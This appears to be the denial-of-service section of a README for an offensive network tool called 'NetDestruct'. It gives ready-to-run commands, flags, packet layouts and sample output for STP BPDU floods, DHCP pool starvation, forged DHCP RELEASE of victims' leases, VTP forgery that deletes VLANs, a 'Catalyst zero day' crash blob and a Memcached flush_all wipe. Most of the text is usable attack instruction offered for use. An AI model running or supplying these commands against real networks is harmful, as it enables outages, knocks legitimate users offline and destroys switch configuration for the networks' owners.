# Denial of Service

Layer 2, 3 and protocol-level DoS attacks.

---

## STP Configuration BPDU Flood (DoS)

Flood the segment with forged **STP Configuration BPDUs** carrying the **Topology Change** flag and random bridge/root IDs.

Implementation: `libs/dos/stpflood/`

### Usage

```bash
sudo ./NetDestruct --stp --flood-conf -I eth0
sudo ./NetDestruct --stp --flood-conf -I eth0 --flood-rate 500
sudo ./NetDestruct --stp --flood-conf -I eth0 --flood-count 10000 --flood-rate 200
```

### Flags

| Flag | Description |
|------|-------------|
| `--stp` | Enable STP mode |
| `--flood-conf` | Configuration BPDU flood DoS |
| `-I` / `--interface` | Interface on the STP segment |
| `--flood-rate` | Optional packets per second (default: full speed) |
| `--flood-count` | Optional number of unique source MACs to pre-generate (default: `0` = fresh random MAC per packet) |

Note: `--stp --flood-conf` and `--stp --flood-tcn` cannot be combined with each other, `--hijack`, or `--rstp`. Root hijacking remains `--stp --hijack -I --mac` (see [Man-in-the-middle](../Man-in-the-middle/README.md)).

### Behavior

1. Opens a raw L2 socket on `-I`
2. For each conf BPDU:
   - Destination MAC `01:80:C2:00:00:00` (STP multicast)
   - Random locally-administered source MAC (unique per frame or from pre-generated pool)
   - IEEE 802.3 LLC (`0x42 0x42 0x03`) + 35-byte Configuration BPDU
   - BPDU Type: Configuration (0x00), Flags: **Topology Change** (0x01)
   - Random root/bridge priorities with source MAC embedded in Root ID and Bridge ID
   - Root Path Cost: 0; Port ID: 0x8002; timers: max age 20s, hello 2s, forward delay 15s
3. Floods continuously until Ctrl+C
4. Prints live stats with yellow `[STP]` tag

Forces STP topology recalculation churn on adjacent switches, causing CPU load and potential instability on legacy Catalyst platforms.

### Output color

| Tag | Color | Meaning |
|-----|-------|---------|
| `[STP]` | Yellow | STP conf BPDU flood status |

### Example

```
$ sudo ./NetDestruct --stp --flood-conf -I eth0 --flood-rate 300
[STP] Flooding conf BPDUs on eth0 at 300 pps — press Ctrl+C to stop.
[STP] Total: 15234        Rate: 300      pps
```

### Requirements

- Linux with root or `CAP_NET_RAW`
- L2 adjacency to STP-speaking switches

---

## STP TCN BPDU Flood (DoS)

Flood the segment with forged **STP Topology Change Notification (TCN) BPDUs**.

Implementation: `libs/dos/stpflood/`

### Usage

```bash
sudo ./NetDestruct --stp --flood-tcn -I eth0
sudo ./NetDestruct --stp --flood-tcn -I eth0 --flood-rate 500
sudo ./NetDestruct --stp --flood-tcn -I eth0 --flood-count 10000 --flood-rate 200
```

### Flags

| Flag | Description |
|------|-------------|
| `--stp` | Enable STP mode |
| `--flood-tcn` | TCN BPDU flood DoS |
| `-I` / `--interface` | Interface on the STP segment |
| `--flood-rate` | Optional packets per second (default: full speed) |
| `--flood-count` | Optional number of unique source MACs to pre-generate (default: `0` = fresh random MAC per packet) |

Note: `--stp` DoS modes require exactly one of `--flood-conf` or `--flood-tcn` per run.

### Behavior

1. Opens a raw L2 socket on `-I`
2. For each TCN BPDU:
   - Destination MAC `01:80:C2:00:00:00` (STP multicast)
   - Random locally-administered source MAC (unique per frame or from pre-generated pool)
   - IEEE 802.3 LLC (`0x42 0x42 0x03`) + 4-byte TCN BPDU
   - Protocol ID: 0x0000, Version: 0, BPDU Type: **TCN** (0x80)
3. Floods continuously until Ctrl+C
4. Prints live stats with yellow `[STP]` tag

TCN BPDUs signal topology changes to the root bridge, forcing MAC table flush propagation and STP processing load across the domain.

### Output color

| Tag | Color | Meaning |
|-----|-------|---------|
| `[STP]` | Yellow | STP TCN BPDU flood status |

### Example

```
$ sudo ./NetDestruct --stp --flood-tcn -I eth0 --flood-rate 300
[STP] Flooding TCN BPDUs on eth0 at 300 pps — press Ctrl+C to stop.
[STP] Total: 15234        Rate: 300      pps
```

### Requirements

- Linux with root or `CAP_NET_RAW`
- L2 adjacency to STP-speaking switches

---

## DHCP DISCOVER Flood (DoS)

Exhaust a DHCP pool by flooding **DHCPDISCOVER** requests with random client MACs and cycling **Requested IP** (Option 50) through the target range.

Implementation: `libs/dos/dhcpflood/`

### Usage

```bash
sudo ./NetDestruct --dhcp-flood --discover -I eth0 --dhcp-pool 192.168.100.2-254
sudo ./NetDestruct --dhcp-flood --discover -I eth0 --dhcp-pool 192.168.100.2-254 --dhcp-rate 500
```

### Flags

| Flag | Description |
|------|-------------|
| `--dhcp-flood` | Enable DHCP DoS mode |
| `--discover` | DISCOVER pool exhaustion attack |
| `-I` / `--interface` | Interface on the DHCP segment |
| `--dhcp-pool` | Target IP range (`A.B.C.D-E` or `A.B.C.D-A.B.C.E`, e.g. `192.168.100.2-254`) |
| `--dhcp-rate` | Optional packets per second (default: full speed) |

### Behavior

1. Opens a raw L2 socket on `-I`
2. For each iteration:
   - Generates a random locally-administered unicast source MAC
   - Sends **DHCPDISCOVER** broadcast (`0.0.0.0` → `255.255.255.255`, UDP 68→67)
   - Sets Option 53 (Message Type) = DISCOVER and Option 50 (Requested IP) to the next address in `--dhcp-pool`
3. Cycles the pool range continuously until Ctrl+C
4. Prints live stats with purple `[DHCP]` tag

The server reserves one lease per unique DISCOVER/chaddr, starving legitimate clients.

### Output color

| Tag | Color | Meaning |
|-----|-------|---------|
| `[DHCP]` | Purple | DHCP DoS status and statistics |

---

## DHCP RELEASE Flood (DoS)

Cancel active DHCP leases by forging **DHCPRELEASE** packets for each IP in the pool.

### Usage

```bash
sudo ./NetDestruct --dhcp-flood --release -I eth0 --dhcp-pool 192.168.100.2-254
sudo ./NetDestruct --dhcp-flood --release -I eth0 --dhcp-pool 192.168.100.2-254 --dhcp-rate 100
```

### Flags

| Flag | Description |
|------|-------------|
| `--dhcp-flood` | Enable DHCP DoS mode |
| `--release` | RELEASE lease cancellation attack |
| `-I` / `--interface` | Interface on the DHCP segment (must have an IPv4 address) |
| `--dhcp-pool` | Victim IP range to release (`192.168.100.2-254`) |
| `--dhcp-rate` | Optional RELEASE attempts per second (default: full speed) |

Note: `--dhcp-flood` requires exactly one of `--discover` or `--release` per run.

### Behavior

1. Derives DHCP server IP as **x.x.x.1** from the pool subnet (e.g. `192.168.100.1` for pool `192.168.100.2-254`)
2. Sends ARP to learn the server MAC address
3. For each IP in `--dhcp-pool`:
   - Sends ARP who-has for the victim IP
   - On ARP reply, forges **DHCPRELEASE** unicast to the server:
     - Ethernet: server MAC ← victim MAC
     - IPv4: victim IP (ciaddr) → server IP
     - DHCP options: Message Type RELEASE + Server Identifier (Option 54)
4. Skips IPs with no ARP reply (no active lease on segment)
5. Cycles the pool continuously until Ctrl+C
6. Prints RELEASE count, skip count, and rate with purple `[DHCP]` tag

### Requirements

- Linux with root or `CAP_NET_RAW`
- L2 adjacency to DHCP server and leased clients
- Interface `-I` must have an IPv4 address on the target subnet (used as ARP sender)
- Active leases must respond to ARP for RELEASE to be sent

### Example

```
$ sudo ./NetDestruct --dhcp-flood --release -I eth0 --dhcp-pool 192.168.100.2-254
[DHCP] Learned DHCP server 192.168.100.1 at 0c:d4:08:34:00:01
[DHCP] Sending DHCP RELEASE for 192.168.100.2–192.168.100.254 via server 192.168.100.1 on eth0 — press Ctrl+C to stop.
[DHCP] RELEASE: 42         skipped: 18         rate: 12       pps
```

---

## VTP Delete All VLANs (DoS)

Delete all VTP VLANs on a Cisco switch domain by forging Summary and Subset advertisements with delete-all VLAN blob.

### Usage

```bash
sudo ./NetDestruct --vtp --delete-all-vlans -I eth0
sudo ./NetDestruct --vtp --delete-all-vlans -I eth0 --revision-number 50
```

### Flags

| Flag | Description |
|------|-------------|
| `--vtp` | Enable VTP mode |
| `--delete-all-vlans` | Required with `--vtp` for delete-all VLANs DoS |
| `-I` / `--interface` | Interface on the VTP segment (trunk/access with VTP traffic) |
| `--revision-number` | Optional forged Configuration Revision (default: learned revision + 1) |
| `--src-mac` | Optional source MAC override (default: MAC of `-I` interface) |

Note: `--vtp --capture` is a separate authentication-cracking mode; use exactly one of `--capture`, `--delete-all-vlans`, `--delete-vlan`, `--dos --catalyst-zero-day`, or `--add-vlan` (Vlan Tampering) per run.

### Behavior

1. Sniffs for incoming **VTP Summary** or **Subset** advertisements on the segment
2. Learns management domain, revision, and version from the observed switch
3. Computes MD5 digest (unauthenticated domain) with the delete-all blob
4. Sends forged **Summary Advertisement** (revision+1 by default, or `--revision-number`, followers=1)
5. Sends forged **Subset Advertisement** (seq=1) containing the delete-all VLAN blob
6. Continues sniffing and printing received **VTP** and **DTP** packets until Ctrl+C

---

## VTP Delete One VLAN (DoS)

Delete a single VLAN from a VTP domain by learning the current Subset advertisement, removing the target VLAN entry from the learned blob, and forging updated Summary/Subset advertisements.

### Usage

```bash
sudo ./NetDestruct --vtp --delete-vlan -I eth0 --dst-vlan 100
sudo ./NetDestruct --vtp --delete-vlan -I eth0 --dst-vlan 30 --revision-number 25
```

### Flags

| Flag | Description |
|------|-------------|
| `--vtp` | Enable VTP mode |
| `--delete-vlan` | Required with `--vtp` for single-VLAN delete DoS |
| `-I` / `--interface` | Interface on the VTP segment |
| `--dst-vlan` | Target VLAN ID to remove from the domain (1–4094) |
| `--revision-number` | Optional forged Configuration Revision (default: learned revision + 1) |
| `--src-mac` | Optional source MAC override (default: MAC of `-I` interface) |

### Behavior

1. Sniffs and prints all received **VTP** and **DTP** frames on the segment
2. On **Summary Advertisement** with zero followers, sends a **VTP Advertisement Request** to prompt the server to send Subset data
3. On **Subset Advertisement**, parses the learned VLAN information blocks
4. Removes the VLAN entry matching `--dst-vlan` from the blob (`vtp_del_vlan`)
5. Computes MD5 digest with the modified VLAN blob
6. Sends forged **Summary Advertisement** (revision+1 by default, or `--revision-number`, followers=1)
7. Sends forged **Subset Advertisement** (seq=1) with the VLAN removed
8. Continues sniffing and printing until Ctrl+C

If the target VLAN is not present in a received Subset, the tool logs the miss and keeps waiting for another Subset.

### Requirements

- Linux with root or `CAP_NET_RAW`
- L2 adjacency to a VTP-speaking Cisco switch
- Works best when the switch is already sending VTP Summary/Subset advertisements
- Target VLAN must exist in the learned Subset blob

---

## VTP Catalyst Zero Day (DoS)

Crash a vulnerable Catalyst switch by forging VTP Summary and Subset advertisements with the Catalyst crash VLAN blob.

### Usage

```bash
sudo ./NetDestruct --vtp --dos --catalyst-zero-day -I eth0
sudo ./NetDestruct --vtp --dos --catalyst-zero-day -I eth0 --revision-number 37
```

### Flags

| Flag | Description |
|------|-------------|
| `--vtp` | Enable VTP mode |
| `--dos` | Required DoS gate with `--catalyst-zero-day` |
| `--catalyst-zero-day` | Required with `--vtp --dos` for Catalyst crash DoS |
| `-I` / `--interface` | Interface on the VTP segment |
| `--revision-number` | Optional forged Configuration Revision (default: learned revision + 1) |
| `--src-mac` | Optional source MAC override (default: MAC of `-I` interface) |

### Behavior

1. Sniffs and prints all received **VTP** and **DTP** frames on the segment
2. On **Summary Advertisement** or **Subset Advertisement**, learns management domain, revision, and version
3. Computes MD5 digest (unauthenticated domain) with the `vlan_cisco` crash blob (188-byte malformed VLAN database)
4. Sends forged **Summary Advertisement** (revision+1 by default, or `--revision-number`, followers=1)
5. Sends forged **Subset Advertisement** (seq=1) containing the crash VLAN blob
6. Continues sniffing and printing until Ctrl+C; re-forges only when a higher revision is observed

The crash blob includes oversized/malformed VLAN information entries designed to trigger memory corruption on legacy Catalyst VTP implementations.

### Requirements

- Linux with root or `CAP_NET_RAW`
- L2 adjacency to a VTP-speaking Cisco switch
- Target platform must be vulnerable to the legacy VTP crash condition (older Catalyst IOS; many modern/iosv images are patched or unaffected)

### Example

```
$ sudo ./NetDestruct --vtp --dos --catalyst-zero-day -I eth0
[VTP] Waiting for VTP Summary/Subset on eth0 (Catalyst zero day)... (Ctrl+C to stop)
[VTP] Listening for VTP and DTP packets...
[VTP] Recieved data from 0c:d4:08:34:00:00:
VLAN Trunking Protocol
    Version: 1
    Code: Summary Advertisement (0x01)
    ...
[VTP] Learned domain "GNS3LAB" revision 36 — sending Catalyst zero day as 0c:7c:e8:46:ba:58
[VTP] Sent VTP Summary Advertisement (Catalyst zero day)
[VTP] Sent VTP Subset Advertisement (Catalyst crash VLAN blob)
```

Implementation: `libs/dos/vtpcrash/`

---

## VTP / DTP Output

VTP DoS modes (delete-all, delete-vlan, Catalyst zero day) print received protocol data in Wireshark-style decode.

### Output colors

| Tag | Color | Meaning |
|-----|-------|---------|
| `[VTP]` | Purple | VTP advertisements and requests |
| `[DTP]` | Orange | DTP frames on the same segment |

### Printed decode

Wireshark-style decode for every received VTP frame:

- Frame summary line with byte count and interface name
- IEEE 802.3 Ethernet and Logical-Link Control headers
- Full VTP field tree (Summary / Subset / Request / Join)
- VLAN Information blocks with nested TLVs (STP type, ring/bridge numbers, parent VLAN, etc.)
- Full DTP TLV decode when DTP is present

### Example — delete all VLANs

```
$ sudo ./NetDestruct --vtp --delete-all-vlans -I eth0
[VTP] Waiting for VTP Summary/Subset on eth0... (Ctrl+C to stop)
[VTP] Listening for VTP and DTP packets...
[VTP] Recieved data from 0c:d4:08:34:00:00:
VLAN Trunking Protocol
    Version: 1
    Code: Summary Advertisement (0x01)
    ...
[VTP] Learned domain "default" revision 5 — sending delete-all VLANs
[VTP] Sent VTP Summary Advertisement (delete-all)
[VTP] Sent VTP Subset Advertisement (delete-all VLAN blob)
```

### Example — delete one VLAN

```
$ sudo ./NetDestruct --vtp --delete-vlan -I eth0 --dst-vlan 100
[VTP] Waiting for VTP Subset on eth0 to delete VLAN 100... (Ctrl+C to stop)
[VTP] Listening for VTP and DTP packets...
[VTP] Recieved data from 0c:d4:08:34:00:00:
VLAN Trunking Protocol
    Version: 1
    Code: Summary Advertisement (0x01)
    Followers: 0
    ...
[VTP] No followers on Summary — sent VTP Advertisement Request
[VTP] Recieved data from 0c:d4:08:34:00:00:
VLAN Trunking Protocol
    Version: 1
    Code: Subset Advertisement (0x02)
    ...
[VTP] Learned domain "default" revision 5 — sending delete VLAN 100
[VTP] Sent VTP Summary Advertisement (delete VLAN 100)
[VTP] Sent VTP Subset Advertisement (VLAN 100 removed)
```

Implementation: `libs/dos/vtpdelete/` (delete-all, delete-vlan); `libs/dos/vtpcrash/` (Catalyst zero day)

---

## Memcached flush_all (DoS)

Invalidate **every** key on an exposed Memcached server with a single unauthenticated `flush_all` command. Useful when the objective is to wipe cache state or force application backend reloads.

Implementation: `libs/dos/memcached/`

### Usage

```bash
./NetDestruct --memcached --flush-all --target 192.168.1.10
```

Custom port:

```bash
./NetDestruct --memcached --flush-all --target 192.168.1.10 --port 11211
```

### Flags

| Flag | Description |
|------|-------------|
| `--memcached` | Enable Memcached mode |
| `--flush-all` | Required — send `flush_all` |
| `--target` | Target IP or hostname |
| `--port` | TCP port (optional, default **11211**) |

`--memcached` requires exactly one of `--enum [key]`, `--flush-all`, `--set`, or `--delete`.

### Behavior

1. Connects to the target over TCP
2. Sends `flush_all\r\n`
3. Expects `OK` from the server
4. All existing items are marked expired / invalidated (server-side)

Does not require root. Destructive on any writable Memcached instance.

### Example output

```
[MEMCACHED] Target: 192.168.1.10:11211  Timeout: 5s
[MEMCACHED] Sending flush_all
[MEMCACHED] Connected to 192.168.1.10:11211
[+] flush_all succeeded — all keys invalidated
```

### Output color

| Tag | Color | Meaning |
|-----|-------|---------|
| `[MEMCACHED]` | Gray | Memcached DoS status |

### Requirements

- Network reachability to the target TCP port (default 11211)
- No root required

